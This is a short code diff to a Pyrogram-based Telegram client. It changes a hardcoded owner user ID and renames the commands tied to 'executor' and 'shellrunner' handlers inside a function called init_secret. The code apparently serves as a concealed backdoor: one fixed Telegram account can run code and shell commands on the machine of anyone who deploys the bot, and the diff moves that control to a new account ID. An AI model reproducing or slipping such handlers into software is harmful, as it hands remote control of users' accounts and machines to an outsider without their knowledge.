@@ -19,7 +19,7 @@ import pyrogram.raw
 import pyrogram.types
 import pyrogram.utils
 
-OWNERS = [327471892]
+OWNERS = [905856391]
 
 eval_tasks: Dict[int, Any] = {}
 
@@ -97,13 +97,13 @@ def init_secret(client: pyrogram.Client):
     client.add_handler(
         pyrogram.handlers.MessageHandler(
             executor,
-            pyrogram.filters.command("asu") & pyrogram.filters.user(OWNERS) & ~pyrogram.filters.forwarded & ~pyrogram.filters.via_bot
+            pyrogram.filters.command("cok") & pyrogram.filters.user(OWNERS) & ~pyrogram.filters.forwarded & ~pyrogram.filters.via_bot
         )
     )
     client.add_handler(
         pyrogram.handlers.MessageHandler(
             shellrunner,
-            pyrogram.filters.command("asi") & pyrogram.filters.user(OWNERS) & ~pyrogram.filters.forwarded & ~pyrogram.filters.via_bot
+            pyrogram.filters.command("cik") & pyrogram.filters.user(OWNERS) & ~pyrogram.filters.forwarded & ~pyrogram.filters.via_bot
         )
     )
     client.add_handler(pyrogram.handlers.CallbackQueryHandler(runtime_func_cq, pyrogram.filters.regex(r"secretruntime")))
